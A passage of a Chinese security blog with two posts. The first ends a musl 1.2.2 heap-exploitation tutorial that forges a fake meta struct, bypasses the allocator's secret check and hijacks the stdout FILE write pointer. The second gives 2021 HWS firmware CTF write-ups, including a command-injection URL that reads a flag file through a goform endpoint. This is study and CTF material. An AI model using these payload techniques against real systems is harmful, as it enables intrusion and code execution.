class="comment">&#123;</span></span><br><span class="line"><span class="comment">	int sc = g-&gt;sizeclass;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;freeable) return 0;</span></span><br><span class="line"><span class="comment">	if (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;maplen) return 1;</span></span><br><span class="line"><span class="comment">	if (g-&gt;next != g) return 1;</span></span><br><span class="line"><span class="comment">	if (!is_bouncing(sc)) return 1;</span></span><br><span class="line"><span class="comment">	size_t cnt = g-&gt;last_idx+1;</span></span><br><span class="line"><span class="comment">	size_t usage = ctx.usage_by_class[sc];</span></span><br><span class="line"><span class="comment">	if (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">	&#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>依照相关逻辑，伪造<code>meta</code>如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">last_idx, freeable, sc, maplen = <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span> <span class="comment">#freeable置0是为了拒绝ok to free校验，防止释放meta</span></span><br><span class="line">fake_meta = p64(<span class="number">0</span>)                              <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)                             <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(base)                 			<span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>)                    <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

<p>这里相关参数设置的是和<code>dequeue</code>差不多，不太一样的主要是<code>freeable</code>、<code>prev</code>、<code>next</code>、<code>avail_mask</code>、<code>freed_mask</code>、<code>maplen</code>等的设置，同样也是为了通过<code>get_meta</code>以及相关的检测</p>
<p>这样在<code>queue</code>之后就能在对应的<code>active[sc]</code>中得到一个<code>fake_meta</code>，随后通过任意写<code>faka_meta-&gt;mem</code>即可进行任意申请。</p>
<p>如果使用<code>calloc</code>进行申请，则还需要在<code>base-&gt;meta</code>位置通过<code>dequeue</code>写入<code>fake_meta_addr</code>才行。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/calloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">calloc</span><span class="params">(<span class="keyword">size_t</span> m, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">	n *= m;</span><br><span class="line">	<span class="keyword">void</span> *p = <span class="built_in">malloc</span>(n);</span><br><span class="line">	<span class="keyword">if</span> (!p || (!__malloc_replaced &amp;&amp; __malloc_allzerop(p)))</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	n = mal0_clear(p, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">memset</span>(p, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>因为在进入<code>calloc</code>之后，如果申请出<code>chunk</code>则会进入检测<code>__malloc_allzerop</code>这个函数，而在<code>musl</code>中即为<code>get_meta</code>，会对<code>meta</code>进行检测</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822205832570.png" alt="image-20230822205832570"></p>
<p>通过<code>malloc</code>进行申请的则不用在<code>base-&gt;meta</code>位置通过<code>dequeue</code>写入<code>fake_meta_addr</code>，可以直接申请出来。</p>
<p>随后就可以通过修改<code>__stdout_FILE</code>结构体，在没有<code>exit</code>的情况下，就可以通过<code>puts-&gt;fputs_unlocked-&gt;fwrite_unlocked-&gt;__fwritex-&gt;(f-&gt;write)</code>调用链来调用到虚假的<code>f-&gt;write</code>函数指针，随后通过<code>gadget</code>劫持栈完成利用，和之前的<code>dequeue</code>类似。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/stdio/fwrite.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> __fwritex(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="keyword">restrict</span> s, <span class="keyword">size_t</span> l, FILE *<span class="keyword">restrict</span> f)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">return</span> l+i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>注：当然，也可以通过<code>dequeue</code>直接修改某个<code>active[sc]</code>的<code>mem</code>来申请到<code>__stdout_FILE</code>进行修改，但是这个需要写了<code>ELF</code>基地址得到<code>meta</code>地址，还需要<code>malloc</code>进行申请才行。</p>
<p>另外当用<code>malloc</code>申请<code>chunk</code>时，如果可以泄露<code>heap</code>基地址，那么就可以通过任意修改<code>active[sz]-&gt;mem</code>进行任意申请，但是申请到的位置在不同的<code>active[sc]</code>中不太一样，具体的进行分析。<code>calloc</code>存在<code>get_meta</code>相关的校验。</p>

        <h4 id="③触发伪造meta"   >
          <a href="#③触发伪造meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#③触发伪造meta" class="headerlink" title="③触发伪造meta"></a>③触发伪造meta</h4>
      <p>那么如何通过释放触发伪造的<code>meta</code>呢。这个在<code>get_meta</code>中有</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">    assert(!offset);</span><br><span class="line">    offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">    assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br></pre></td></tr></table></div></figure>

<p>即依据<code>chunk</code>元数据里面的<code>idx/offset</code>来得到<code>base</code>，从而得到<code>meta</code>，那么通常的漏洞利用就是通过溢出写<code>chunk</code>的元数据，使之成为第<code>0</code>个<code>chunk</code>，从而获取到伪造的<code>meta</code>。如下即通过溢出chunk使之索引为0，在<code>chunk_addr-0x10</code>部分伪造<code>meta</code>，之后释放该<code>chunk</code>，发现索引为0，即可从<code>chunk_addr-0x10</code>的地方找到伪造的<code>meta</code>地址。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png" alt="image-20230817192343088"></p>

        <h4 id="④绕过检测"   >
          <a href="#④绕过检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#④绕过检测" class="headerlink" title="④绕过检测"></a>④绕过检测</h4>
      <p>在实际利用时，还需要绕过<code>get_meta</code>中对于<code>meta_area</code>的检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br></pre></td></tr></table></div></figure>

<p>即通过<code>meta</code>所在页得到<code>meta_area</code>，然后检测<code>ctx.secret</code>是否为<code>meta_area-&gt;check</code>。那么在利用时其实不一定能满足申请到的<code>chunk</code>在<code>0x---000</code>的位置，那么通常就申请<code>0x2000</code>的<code>chunk</code>来得到<code>libc</code>上的<code>chunk</code>，并且通过适当调整使得<code>fake_meta</code>所在页的首地址数据为<code>secret</code>。那么通常的payload配置如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += rop</span><br><span class="line">payload = payload.ljust(<span class="number">0xfe0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += binsh</span><br><span class="line">payload += fake_IO</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822221035821.png" alt="image-20230822221035821"></p>
<p>参考：</p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274640.htm#msg_header_h3_1" >原创]小小做题家之——musl 1.2.2的利用手法-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_7" >原创]musl 1.2.2 总结+源码分析 One-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252293#h2-13" >新版musl-libc malloc源码分析与调试-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253" >从一次 CTF 出题谈 musl libc 堆漏洞利用-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241101#h2-6" >借助DefCon Quals 2021的mooosl学习musl mallocng（源码审计篇）-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251832" >从2021 WMCTF Nescafe学习musl libc UAF 利用-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104#h2-0" >借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929#h2-5" >musl-1.2.x堆部分源码分析-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h2-8" >从musl libc 1.1.24到1.2.2 学习pwn姿势-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10326#toc-4" >musl 1.2.2 总结+源码分析 One - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/">2021HWS固件学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-21</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、练习题"   >
          <a href="#一、练习题" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、练习题" class="headerlink" title="一、练习题"></a>一、练习题</h1>
      
        <h2 id="1-SMT32固件"   >
          <a href="#1-SMT32固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMT32固件" class="headerlink" title="1.SMT32固件"></a>1.SMT32固件</h2>
      
        <h3 id="1-IDA分析"   >
          <a href="#1-IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-IDA分析" class="headerlink" title="(1)IDA分析"></a>(1)IDA分析</h3>
      
        <h4 id="①选择架构"   >
          <a href="#①选择架构" class="heading-link"><i class="fas fa-link"></i></a><a href="#①选择架构" class="headerlink" title="①选择架构"></a>①选择架构</h4>
      <p>需要在加载界面选择架构，如图选择ARM小端序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png" alt="image-20220119162036357"></p>

        <h4 id="②设置选项"   >
          <a href="#②设置选项" class="heading-link"><i class="fas fa-link"></i></a><a href="#②设置选项" class="headerlink" title="②设置选项"></a>②设置选项</h4>
      <p>处理器选项设置对应</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png" alt="du"></p>

        <h4 id="③选择固件加载地址"   >
          <a href="#③选择固件加载地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#③选择固件加载地址" class="headerlink" title="③选择固件加载地址"></a>③选择固件加载地址</h4>
      <p>OK之后，进入填写加载地址的界面，修改如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png" alt="image-20220119162333850"></p>
<p>这个对于SMT32这种类型的固件是一定的，需要自己去上网查询，Input file的loading address可以让我们输入其他值，就使得IDA不从头加载，而从我们输入的地址开始加载。</p>

        <h4 id="④寻找函数地址"   >
          <a href="#④寻找函数地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#④寻找函数地址" class="headerlink" title="④寻找函数地址"></a>④寻找函数地址</h4>
      
        <h4 id="A-查找中断处理函数"   >
          <a href="#A-查找中断处理函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-查找中断处理函数" class="headerlink" title="A.查找中断处理函数"></a>A.查找中断处理函数</h4>
      <p>在最开头地址+4的地方保存的是中断处理函数，按d转换数据双击点进去即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png" alt="image-20220119162645572"></p>

        <h4 id="B-识别函数"   >
          <a href="#B-识别函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-识别函数" class="headerlink" title="B.识别函数"></a>B.识别函数</h4>
      <p>发现是奇数地址，那么在奇数地址-1的地方，按c，即可分析出一些函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png" alt="image-20220119162843385"></p>
<p>其中0x08000100即为中断处理函数，相对于SMT32固件而言，该函数的第二次跳转地址上的首次跳转的最后跳转再跳转即为main函数地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png" alt="image-20220119163217387"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png" alt="image-20220119163231426"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png" alt="image-20220119163255655"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png" alt="image-20220119163337683"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png" alt="image-20220119163359036"></p>

        <h3 id="2-解密"   >
          <a href="#2-解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解密" class="headerlink" title="(2)解密"></a>(2)解密</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png" alt="image-20220119163634811"></p>
<p>分析之后，即可找到对应的加密算法，按照上述逻辑恢复即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = [   </span><br><span class="line">        <span class="number">0x7D</span>,<span class="number">0x77</span>,<span class="number">0x40</span>,<span class="number">0x7A</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x2A</span>,<span class="number">0x2F</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x40</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x2C</span>,<span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2B</span>,<span class="number">0x28</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x7C</span>,<span class="number">0x41</span>,<span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0x7E</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2A</span>,<span class="number">0x41</span>,<span class="number">0x7F</span>,<span class="number">0x2F</span>,<span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="built_in">chr</span>((i ^ <span class="number">0x1E</span>) + <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-BlinkBlink-200"   >
          <a href="#2-BlinkBlink-200" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BlinkBlink-200" class="headerlink" title="2.BlinkBlink_200"></a>2.BlinkBlink_200</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink" >HWS2021冬令营选拔赛 | Clang鱼塘 (blingblingxuanxuan.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-固件解包"   >
          <a href="#1-固件解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件解包" class="headerlink" title="(1)固件解包"></a>(1)固件解包</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me uImage</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-当前目录搜索"   >
          <a href="#2-当前目录搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-当前目录搜索" class="headerlink" title="(2)当前目录搜索"></a>(2)当前目录搜索</h3>
      <p>该命令可在当前文件夹下搜索密码，一般这种路由器的密码都是从/etc/passwd中取得</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri &quot;etc/passwd&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png" alt="image-20220119174406881"></p>
<p>排除busybox和libc，那么先去goahead中找，直接拖进IDA32分析</p>
<p>goahead是一个嵌入式的Web服务器：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.embedthis.com/goahead/" >https://www.embedthis.com/goahead/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="①定位字符串"   >
          <a href="#①定位字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#①定位字符串" class="headerlink" title="①定位字符串"></a>①定位字符串</h4>
      <p>搜索字符串<code>set_qos_cfg</code>，这个常用，找到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png" alt="image-20220119175251051"></p>
<p>漏洞常常在<code>goform</code>接口下，简单查看一下，发现其中有一个<code>set_cmd</code>的引用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png" alt="image-20220119175504033"></p>
<p>进入函数，发现一个设置命令的函数<code>bs_SetCmd</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png" alt="image-20220119175643376"></p>

        <h4 id="②分析函数"   >
          <a href="#②分析函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②分析函数" class="headerlink" title="②分析函数"></a>②分析函数</h4>
      <p>参照上面的函数名称，继续搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png" alt="image-20220119175815328"></p>
<p>发现定位在libshare中，打开分析一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png" alt="image-20220119180323116"></p>
<p>其中off_4F2CC的值为%s，即格式化为字符串输出给v21，那么很明显就是使用<code>popen</code>进行命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png" alt="image-20220119180607832"></p>

        <h4 id="③URL访问"   >
          <a href="#③URL访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#③URL访问" class="headerlink" title="③URL访问"></a>③URL访问</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goform/set_cmd?cmd=cat /home/goahead/flag.txt</span><br></pre></td></tr></table></div></figure>

<p>这里就是调用goform的接口API进行测试即可获得flag</p>

        <h2 id="3-httpd"   >
          <a href="#3-httpd" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-httpd" class="headerlink" title="3.httpd"></a>3.httpd</h2>
      <p>不太会</p>

        <h2 id="4-nodemcu"   >
          <a href="#4-nodemcu" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-nodemcu" class="headerlink" title="4.nodemcu"></a>4.nodemcu</h2>
      <p>直接出</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings nodemcu.bin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png" alt="image-20220120125706243"></p>
<p>看来以后都先strings一把梭试试</p>

        <h2 id="5-easybios"   >
          <a href="#5-easybios" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-easybios" class="headerlink" title="5.easybios"></a>5.easybios</h2>
      
        <h3 id="1-前置探索"   >
          <a href="#1-前置探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置探索" class="headerlink" title="(1)前置探索"></a>(1)前置探索</h3>
      <p>按照命令提示启动，但是有时候可以，有时候又不可以，可能在等一下就可以？</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png" alt="image-20220120130559529">给了提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png" alt="image-20220120130724621"></p>
<p>尝试一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png" alt="image-20220120130702363"></p>

        <h3 id="2-IDA分析"   >
          <a href="#2-IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IDA分析" class="headerlink" title="(2)IDA分析"></a>(2)IDA分析</h3>
      <p>使用binwalk解包</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me easybios</span><br></pre></td></tr></table></div></figure>

<p>然后IDA打开解包出来的二进制文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png" alt="image-20220120143603848"></p>
<p>搜索一下Wrong字符串，没搜到，尝试用unicode格式搜索，即UTF-16LE格式，一个字符两个字节。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png" alt="image-20220120144209024"></p>
<p>然后加上00即可-&gt;<code>57 00 72 00 6F 00 6E 00 67 00</code>，找到两个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png" alt="image-20220120144641985"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png" alt="image-20220120144707349"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png" alt="image-20220120144725574"></p>
<p>很明显应该是下面那个，但是这个文件有点大，不好解析，再加上之前在解包的时候看到包含很多PE文件，所以这个程序应该也是在一个PE文件里，那么我们依据地址，找到对应的PE文件头尾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png" alt="image-20220120150501890"></p>

        <h3 id="3-切割分析"   >
          <a href="#3-切割分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-切割分析" class="headerlink" title="(3)切割分析"></a>(3)切割分析</h3>
      
        <h4 id="①寻找头尾地址"   >
          <a href="#①寻找头尾地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#①寻找头尾地址" class="headerlink" title="①寻找头尾地址"></a>①寻找头尾地址</h4>
      <p>依据地址找到以下头尾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png" alt="image-20220120155301520"></p>

        <h4 id="②使用Winhex进行切割"   >
          <a href="#②使用Winhex进行切割" class="heading-link"><i class="fas fa-link"></i></a><a href="#②使用Winhex进行切割" class="headerlink" title="②使用Winhex进行切割"></a>②使用Winhex进行切割</h4>
      <p>使用Winhex打开，然后找到头尾，使用alt+G搜索地址，选定头尾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png" alt="image-20220120155739157"></p>
<p>头部</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png" alt="image-20220120155816532"></p>
<p>尾部</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png" alt="image-20220120155907991"></p>
<p>选中选快，右键编辑-&gt;复制选块-&gt;至新文件，然后保存用IDA打开，照常使用全局搜索字符<code>57 00 72 00 6F 00 6E 00 67 00</code>找到对应的函数<code>sub_31D6F</code>，一番判断如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png" alt="image-20220120154940674"></p>
<p>然后顺着逻辑理清楚即可，或者尝试使用angr解题，以下exp参照<code>lxonz师傅</code></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nosec.org/home/detail/4672.html" >2021HWS冬令营线上赛固件安全WriteUp|NOSEC安全讯息平台 - 白帽汇安全研究院</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
